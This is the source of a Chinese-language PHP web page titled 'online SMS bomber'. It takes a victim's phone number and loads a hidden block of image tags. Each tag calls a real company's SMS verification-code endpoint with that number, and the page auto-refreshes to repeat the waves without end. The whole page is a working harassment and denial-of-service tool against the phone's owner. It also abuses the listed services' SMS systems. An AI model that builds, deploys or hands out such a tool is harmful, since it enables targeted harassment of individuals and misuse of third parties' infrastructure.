<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<title>在线短信轰炸</title>
<link href="css/css.css" rel="stylesheet" media="screen">
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
</head>
<body>
<div class="container">
<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">轰炸机仪表盘</h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">目标</span>
		<form method="GET" action="api.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="在此输入手机号" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">开炮！</button>
		<button type="button" class="btn btn-success" onclick="location='api.php'">停火！</button>
		<button type="button" class="btn btn-info" onclick="top.location='./'">★刷新本页</button>
		
		</div>
		</form>

<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$timers=$a*18;
$d=$_GET['hm'];
?>
<?php
if($d>1){
	echo "<br /><div class='progress progress-striped active'>
            <div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div>
        </div>";
	echo "<div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>
轰炸线程已启动！ 轰<strong>$d</strong>，第<strong>$a</strong>波攻击，理论共炸<strong>$timers</strong>次。 <a href='#faq' target='_blank'><i></i></a>
</div>
</div>";
    echo "<div style='display:none'>
<img src='https://account.niu.com/v3/api/auth/verify/code?mobile=$d&email=&country_code=86&type=signup&logon_mode=mobile' alt=''/>
<img src='https://mall.cnki.net/uc/RegServer.ashx?t=1&key=$d&v=0.9391179322518282' alt=''/>
<img src='https://www.tanwan.com/api/reg_json_2019.php?act=3&phone=$d&callback=jQuery112005094453070699978_1639928758626&_=1639928758629' alt=''/>
<img src='https://reg.qun.hk/v2/captcha/send?phone=$d&sign=22758ac39001fab745244b07c6a0d1d5&product=qun' alt=''/>
<img src='https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$d&Captcha=&_=1627172292814' alt=''/>
<img src='https://m.yiwise.com/apiPlatform/verificationCode/send?phoneNumber=$d' alt=''/>
<img src='https://bo.boboboom.cn/api/sms/send=$d&event=register' alt=''/>
<img src='https://dss.xiongmaopeilian.com/student_wx/student/send_sms_code?country_code=86&mobile=$d' alt=''/>
<img src='https://services.qiye.163.com/service/official/sendCode?jsonpcallback=jQuery190039810459070645865_1584688891341&mobile=$d&_=1584688891342' alt=''/>
<img src='https://www.51hawo.com/apollo/MobileCode/sendMobileCode?mobile=$d&sms_type=101&register_from=20000091' alt=''/>
<img src='https://login1.q1.com/Validate/SendMobileLoginCode?jsoncallback=jQuery1111039587384237433687_1627172292811&Phone=$d&Captcha=&_=1627172292814' alt=''/>
<img src='https://swx.qzrc.com/home/sendnote?phone=$d&code=&imgid=%E2%80%98%20alt=' alt=''/>
<img src='https://www.xuebangsoft.net/eduboss/CommonAction/sendVarifyCodeToPhone.do?phoneNumber=$d&regTimeCode=1589627585503' alt=''/>
<img src='https://zjtj.fkhongdan.com/hongdan/user/sendVerCode.action?phoneNum=$d&sid=26000000000' alt=''/>
<img src='https://id.ifeng.com/api/simplesendmsg?mobile=$d&comefrom=7&auth=&msgtype=0' alt=''/>
<img src='https://user.daojia.com/mobile/getcode?mobile=$d' alt=''/>
<img src='https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx?$=1&PhoneNo=$d&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE' alt=''/>
<img src='https://mobile.cmbchina.com/DUserManage/UserRegisterNew/URN_Register.aspx?RequestMode=1&PhoneNo=$d&ClientNo=f20c5365321b4411a0ae4aa8d5ddd608&Command=CMD_SENGMSGCODE' alt=''/>
<img src='https://api.hetao101.com/login/v2/account/oauth/verifyCode?phoneNumber=$d' alt=''/>
<img src='https://uniwechat.saicskoda.com.cn/wxPage/WebHandler.ashx?userid=oeXPu5-_nc6Yr6JmU8vj720WZ6wg&toid=08161&type=sendsms&tel=$d' alt=''/>
<img src='http://byren.cn/plugin.php?id=comiis_sms&action=register&comiis_tel=$d' alt=''/>
<img src='https://api.eol.cn/web/api/?phone=$d&signsafe=8407b7032072b547a9cb807bf163ed2d&txyzm=&uri=apigkcx/api/user/sendsmscode&signsafe=a03cfc5214ca5f8c838ab96ceba58fff' alt=''/>
<img src='https://www.duanxinhongzhaji.com/free/index.php?hm=$d&ok=' alt=''/>
<img src='https://api.qingmang.mobi/v1/account.sendVerification?platform=console&token=&phone=%2B86$d&code=42514565' alt=''/>
</div>
	";
     echo"<meta http-equiv=refresh content='0; url=api.php?hm=$d&amp;c=$a'>";
}else{
}
?>
<div class="bs-callout bs-callout-info">
    
</div>
</div>
</script>
<script language="javascript" type="text/javascript" src="http://js.users.51.la/18759442.js"></script>
</body>
</html>
